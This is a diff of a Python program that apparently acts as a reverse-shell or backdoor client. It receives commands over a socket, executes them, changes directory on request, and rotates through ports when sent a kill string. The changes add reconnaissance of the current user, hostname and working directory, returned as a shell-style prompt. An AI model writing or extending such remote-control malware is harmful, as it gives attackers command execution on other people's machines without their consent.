@@ -10,7 +10,7 @@ PORT = ports[0]
 BUFFER = 1024
 
 KILLSTRING = "endme"
-
+INFO_QUERY = "informationquery"
 
 def nextPort(p):
 	global ports
@@ -19,6 +19,13 @@ def nextPort(p):
 		return ports[0]
 	return ports[i+1]
 	
+
+def getInfo():
+	user = subprocess.getoutput("whoami")
+	host = subprocess.getoutput("hostname")
+	curdir = os.getcwd()
+	return user + "@" + host + ":" + curdir + "$ "
+
 
 open_conn = False
 while True:
@@ -31,18 +38,21 @@ while True:
 			open_conn = True
 			
 		cmd = s.recv(BUFFER).decode()
+		print("Received: " + cmd)
 		
 		if cmd == KILLSTRING:
-			print("Ending")
+			print("Ending session")
 			open_conn = False
 			s.close()
 			PORT = nextPort(PORT)
 			time.sleep(1)
 		else:
-			if "cd" in cmd:
+			if cmd == INFO_QUERY:
+				rsp = getInfo()
+			elif "cd" in cmd:
 				try:
 					os.chdir(cmd[3::])
-					rsp = "Currently in" + str(os.getcwd())
+					rsp = "informationquery" + getInfo()
 				except:
 					rsp = "No such directory"
 			else:
